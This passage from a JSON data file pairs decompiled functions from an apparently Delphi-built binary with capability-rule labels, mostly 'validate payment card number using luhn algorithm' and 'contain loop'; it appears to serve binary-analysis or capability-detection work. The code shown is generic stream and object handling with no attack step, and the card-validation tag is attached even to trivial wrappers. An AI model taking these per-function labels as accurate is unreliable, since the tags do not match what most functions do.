        "decompiled_code": "\nvoid __fastcall fcn.0041a3f8(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x41a48d;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    iVar1 = (**(*in_EAX + 0x14))();\n    iVar2 = (**(*param_2 + 0x14))();\n    if ((iVar1 == iVar2) && (-1 < iVar1 + -1)) {\n        uVar3 = true;\n        do {\n            (**(*in_EAX + 0xc))();\n            (**(*param_2 + 0xc))(0);\n            fcn.00405974();\n            if (!uVar3) break;\n            iVar1 = iVar1 + -1;\n            uVar3 = iVar1 == 0;\n        } while (!uVar3);\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x41a494;\n    uStack44 = 0x41a48c;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 340
    },
    "0041a4a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a4a4(uint param_1, uint param_2)\n\n{\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar auStack16 [4];\n    uchar uStack12;\n    \n    fcn.0041a4a0();\n    uStack12 = 0;\n    uStack52 = 0;\n    iStack48 = fcn.0040db40(0, auStack16);\n    if (iStack48 == 0) {\n        iStack48 = fcn.00405470();\n    }\n    uStack44 = param_2;\n    // WARNING: Could not recover jumptable at 0x00404ee5. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x496014)(0xeedfade, 1, 7, &uStack52);\n    return;\n}\n",
        "token_count": 200
    },
    "0041a534": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041a534(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x41a60f;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x41a562;\n    fcn.0041a328();\n    uStack52 = 0x41a5ea;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    (**(*in_EAX + 0xc))();\n    (**(*in_EAX + 0x18))();\n    (**(*in_EAX + 0xc))();\n    (**(*in_EAX + 0x20))();\n    (**(*in_EAX + 0x18))();\n    (**(*in_EAX + 0x24))();\n    (**(*in_EAX + 0x20))();\n    (**(*in_EAX + 0x24))();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x41a5f1;\n    uStack52 = 0x41a5e9;\n    fcn.0041a3e4();\n    return;\n}\n",
        "token_count": 363
    },
    "0041a7b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041a7b8(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41a830;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    iVar1 = (**(*in_EAX + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar2 = (**(*in_EAX + 0x34))();\n            if (iVar2 == 0) break;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41a837;\n    uStack36 = 0x41a82f;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 268
    },
    "0041a844": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a844(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_18h = 0;\n    var_14h = 0;\n    var_4h = 0;\n    uStack44 = 0x41a907;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    var_8h = param_2;\n    iVar1 = (**(*in_EAX + 0x14))();\n    if (-1 < iVar1 + -1) {\n        var_ch = 0;\n        var_10h = iVar1;\n        do {\n            (**(*in_EAX + 0xc))();\n            fcn.0041b020();\n            fcn.00405718();\n            iVar1 = fcn.0040e8d4();\n            if (iVar1 != 0) {\n                fcn.00405a44(&fcn.0041a844::var_18h);\n                iVar1 = (**(*in_EAX + 0x34))();\n                if (iVar1 == 0) goto code_r0x0041a8e4;\n            }\n            var_ch = var_ch + 1;\n            var_10h = var_10h + -1;\n        } while (var_10h != 0);\n    }\n    var_ch = -1;\ncode_r0x0041a8e4:\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x41a90e;\n    uStack44 = 0x41a8fe;\n    fcn.00405554();\n    uStack44 = 0x41a906;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 476
    },
    "0041a9d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a9d0(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x41aa6d;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x41a9f8;\n    fcn.0041a328();\n    uStack40 = 0x41aa50;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    (***param_2)();\n    fcn.0041b730();\n    fcn.00405620();\n    (**(*param_2 + 0xc))();\n    (**(*in_EAX + 0x2c))();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x41aa57;\n    uStack40 = 0x41aa4f;\n    fcn.0041a3e4();\n    return;\n}\n",
        "token_count": 312
    },
    "0041aa7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041aa7c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x41ab1d;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (param_1 != param_2) {\n        puStack40 = 0x41aaab;\n        fcn.0041a328();\n        uStack44 = 0x41ab00;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        puStack40 = &stack0xfffffffc;\n        (**(*in_EAX + 0xc))();\n        uVar1 = (**(*in_EAX + 0x18))();\n        (**(*in_EAX + 0x48))();\n        (**(*in_EAX + 100))();\n        *in_FS_OFFSET = uVar1;\n        uStack44 = 0x41ab07;\n        uStack48 = 0x41aaff;\n        fcn.0041a3e4();\n        return;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41ab24;\n    uStack32 = 0x41ab1c;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 377
    },
    "0041ab60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041ab60(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_ch = 0;\n    uStack24 = 0x41ac04;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x41ab87;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.0041dc9c();\n    puStack32 = 0x41ab8f;\n    fcn.0041a328();\n    uStack36 = 0x41abdf;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    (**(*var_4h + 0x44))();\n    while( true ) {\n        cVar1 = fcn.0041cbe8();\n        if (cVar1 != '\\0') break;\n        fcn.0041e9cc();\n        (**(*var_4h + 0x38))();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41abe6;\n    uStack36 = 0x41abde;\n    fcn.0041a3e4();\n    return;\n}\n",
        "token_count": 389
    },
    "0041b370": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041b370(void)\n\n{\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + 0x28))();\n    return;\n}\n",
        "token_count": 39
    },
    "0041b444": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b444(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    int32_t in_EDX;\n    \n    (**(*in_EAX + 0x84))();\n    if (in_EAX[7] == in_EAX[8]) {\n        fcn.0041b370();\n    }\n    if (in_EDX < in_EAX[7]) {\n        fcn.004030fc();\n    }\n    puVar1 = in_EAX[6] + in_EDX * 8;\n    *puVar1 = 0;\n    puVar1[1] = arg_8h;\n    fcn.00405584();\n    in_EAX[7] = in_EAX[7] + 1;\n    (**(*in_EAX + 0x80))();\n    return;\n}\n",
        "token_count": 192
    },
    "0041b730": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041b730(void)\n\n{\n    ulong uVar1;\n    int32_t *in_EAX;\n    \n    uVar1 = (**(*in_EAX + 0x18))(0, 0);\n    return uVar1;\n}\n",
        "token_count": 56
    },
    "0041b81c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041b81c(uint arg_8h)\n\n{\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    fcn.00404530();\n    var_8h = &var_108h;\n    var_4h._0_1_ = 4;\n    fcn.0040dbfc(0, &var_8h);\n    fcn.00404ec4();\n    return;\n}\n",
        "token_count": 116
    },
    "0041bac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041bac0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStackY32;\n    uint uStackY28;\n    uchar *puStackY24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStackY24 = 0x41badc;\n    fcn.0041c334(0x1000);\n    uStackY28 = 0x41bb10;\n    uStackY32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStackY24 = &stack0xfffffffc;\n    fcn.0041e57c();\n    *in_FS_OFFSET = uStackY32;\n    puStackY24 = 0x41bb17;\n    uStackY28 = 0x41bb0f;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 192
    },
    "0041bb20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041bb20(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 4) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 163
    },
    "0041bbe4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041bbe4(uint32_t arg_8h)\n\n{\n    uint in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_DL = extraout_DL;\n    }\n    uVar1 = 0;\n    fcn.0041bc28(0, arg_8h & 0xffff);\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 148
    },
    "0041c028": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041c028(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    fcn.00405584();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 136
    },
    "0041c188": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041c188(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint noname_0;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_DL = extraout_DL;\n    }\n    fcn.00404620();\n    noname_0 = 0;\n    fcn.004059dc();\n    fcn.0041c280(noname_0, arg_8h);\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = noname_0;\n    }\n    return in_EAX;\n}\n",
        "token_count": 167
    },
    "0041c334": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041c334(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    uVar1 = fcn.00402f00();\n    *(in_EAX + 8) = uVar1;\n    *(in_EAX + 0xc) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 208
    },
    "0041c480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041c480(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 8) = arg_14h;\n    *(in_EAX + 0xc) = arg_10h;\n    fcn.00405584();\n    fcn.00405584();\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 222
    },
    "0041ca20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041ca20(void)\n\n{\n    uchar auStack12 [4];\n    uchar uStack8;\n    \n    uStack8 = 0xb;\n    fcn.0040dbfc(0, auStack12);\n    fcn.00404ec4();\n    return;\n}\n",
        "token_count": 64
    },
    "0041cf30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0041cf30(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    int32_t iStack20;\n    \n    iVar2 = fcn.00404528();\n    do {\n        if (iVar2 == *0x417528) {\n            if (*(in_EAX + 0x84) == 0) {\n                uVar4 = fcn.00418fc0();\n            }\n            else {\n                uVar4 = fcn.00418ec0();\n            }\n            return uVar4;\n        }\n        piVar3 = fcn.00418f48();\n        if ((piVar3 != NULL) && (iVar2 = *piVar3,  -1 < iVar2 + -1)) {\n            iStack20 = 0;\n            do {\n                uVar4 = **(piVar3 + iStack20 * 2 + 1);\n                cVar1 = fcn.00404544();\n                if (cVar1 != '\\0') {\n                    return uVar4;\n                }\n                iStack20 = iStack20 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        iVar2 = fcn.004045dc();\n    } while( true );\n}\n",
        "token_count": 300
    },
    "0041d15c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d15c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x41d16f;\n    (**(*param_2 + 0x20))();\n    uStack24 = 0x41d1fc;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    cVar1 = fcn.0041cbe8();\n    if (cVar1 == '\\0') {\n        fcn.0041a0d8();\n    }\n    while( true ) {\n        cVar1 = fcn.0041cbe8();\n        if (cVar1 != '\\0') break;\n        cVar1 = fcn.0041cfe0();\n        if (cVar1 - 2U < 3) {\n            fcn.0041dbec();\n        }\n        fcn.0041a0b8();\n        fcn.0041dc9c();\n        while( true ) {\n            cVar1 = fcn.0041cbe8();\n            if (cVar1 != '\\0') break;\n            fcn.0041de08();\n        }\n        fcn.0041dca4();\n    }\n    fcn.0041dca4();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41d203;\n    uStack24 = 0x41d1fb;\n    (**(*param_2 + 0x24))();\n    return;\n}\n",
        "token_count": 387
    },
    "0041d8cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041d8cc(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    while( true ) {\n        puStack32 = 0x41d8ee;\n        cVar3 = fcn.0041cbe8();\n        if (cVar3 != '\\0') break;\n        puStack32 = 0x41d8e6;\n        fcn.0041de08();\n    }\n    puStack32 = 0x41d8fa;\n    fcn.0041dca4();\n    uVar1 = *(in_EAX + 0x2c);\n    uVar2 = *(in_EAX + 0x28);\n    puStack32 = 0x41d917;\n    uVar4 = fcn.0040484c();\n    *(in_EAX + 0x2c) = uVar4;\n    uStack36 = 0x41d98e;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar5 = fcn.0040484c();\n    *(in_EAX + 0x28) = iVar5;\n    if (iVar5 == 0) {\n        *(in_EAX + 0x28) = *(in_EAX + 0x18);\n    }\n    while( true ) {\n        cVar3 = fcn.0041cbe8();\n        if (cVar3 != '\\0') break;\n        fcn.0041d61c();\n    }\n    fcn.0041dca4();\n    *in_FS_OFFSET = uStack40;\n    *(in_EAX + 0x2c) = uVar1;\n    *(in_EAX + 0x28) = uVar2;\n    return;\n}\n",
        "token_count": 473
    },
    "0041d9d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0041d9d4(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    double dStack20;\n    \n    cVar2 = fcn.0041eb6c();\n    if (cVar2 == '\\x15') {\n        fcn.0041d004();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.0041dc58();\n        dStack20 = iVar1;\n    }\n    return dStack20;\n}\n",
        "token_count": 138
    },
    "0041da18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0041da18(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    float fStack16;\n    \n    cVar2 = fcn.0041eb6c();\n    if (cVar2 == '\\x0f') {\n        fcn.0041d004();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.0041dc58();\n        fStack16 = iVar1;\n    }\n    return fStack16;\n}\n",
        "token_count": 137
    },
    "0041da5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0041da5c(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int64_t iStack20;\n    \n    cVar2 = fcn.0041eb6c();\n    if (cVar2 == '\\x10') {\n        fcn.0041d004();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.0041dc58();\n        iStack20 = ROUND(iVar1 * *0x41daa8);\n    }\n    return iStack20;\n}\n",
        "token_count": 149
    },
    "0041daac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0041daac(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    double dStack20;\n    \n    cVar2 = fcn.0041eb6c();\n    if (cVar2 == '\\x11') {\n        fcn.0041d004();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.0041dc58();\n        dStack20 = iVar1;\n    }\n    return dStack20;\n}\n",
        "token_count": 136
    },
    "0041dbec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041dbec(void)\n\n{\n    char cVar1;\n    int32_t iStack12;\n    char cStack8;\n    uchar uStack7;\n    int16_t iStack6;\n    \n    cVar1 = fcn.0041eb6c();\n    if (cVar1 == '\\x02') {\n        fcn.0041d004();\n        iStack12 = cStack8;\n    }\n    else if (cVar1 == '\\x03') {\n        fcn.0041d004();\n        iStack12 = iStack6;\n    }\n    else if (cVar1 == '\\x04') {\n        fcn.0041d004();\n    }\n    else {\n        fcn.0041ca14();\n    }\n    return CONCAT26(iStack6, CONCAT15(uStack7, CONCAT14(cStack8, iStack12)));\n}\n",
        "token_count": 189
    },
    "0041dc58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041dc58(void)\n\n{\n    char cVar1;\n    int32_t iStack12;\n    int32_t iStack8;\n    \n    cVar1 = fcn.0041cfe0();\n    if (cVar1 == '\\x13') {\n        fcn.0041eb6c();\n        fcn.0041d004();\n    }\n    else {\n        iStack12 = fcn.0041dbec();\n        iStack8 = iStack12 >> 0x1f;\n    }\n    return CONCAT44(iStack8, iStack12);\n}\n",
        "token_count": 128
    },
    "0041e060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041e060(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = fcn.004192a8();\n    if ((pcVar2 != NULL) && (cVar1 = (*pcVar2)(),  cVar1 != '\\0')) {\n        fcn.00416690();\n        return;\n    }\n    fcn.0041ca14();\n    return;\n}\n",
        "token_count": 109
    },
    "0041e51c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e51c(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00405584();\n    while( true ) {\n        cVar1 = fcn.00419440();\n        if (cVar1 != '\\0') break;\n        fcn.0040afa0(param_2);\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "0041e9cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041e9cc(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x41ea79;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    cVar1 = fcn.0041cfe0();\n    if ((cVar1 == '\\x12') || (cVar1 == '\\x14')) {\n        fcn.0041ea88();\n        fcn.004057d4();\n    }\n    else {\n        cVar1 = fcn.0041eb6c();\n        if (cVar1 == '\\x06') {\n            fcn.0041d004();\n        }\n        else if (cVar1 == '\\f') {\n            fcn.0041d004();\n        }\n        else {\n            fcn.0041ca14();\n        }\n        fcn.00405c6c();\n        fcn.0041d004();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x41ea80;\n    uStack28 = 0x41ea78;\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 307
    },
    "0041ea88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041ea88(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x41eb5f;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    cVar1 = fcn.0041cfe0();\n    if ((cVar1 == '\\x06') || (cVar1 == '\\f')) {\n        fcn.0041e9cc();\n        fcn.00405ea8();\n    }\n    else {\n        cVar1 = fcn.0041eb6c();\n        if (cVar1 == '\\x12') {\n            fcn.0041d004();\n            fcn.00405fa4();\n            fcn.0041d004();\n        }\n        else if (cVar1 == '\\x14') {\n            fcn.0041d004();\n            fcn.00405c6c();\n            fcn.0041d004();\n            fcn.00407448();\n        }\n        else {\n            fcn.0041ca14();\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41eb66;\n    uStack32 = 0x41eb56;\n    fcn.00405530();\n    uStack32 = 0x41eb5e;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 358
    },
    "0041ee74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
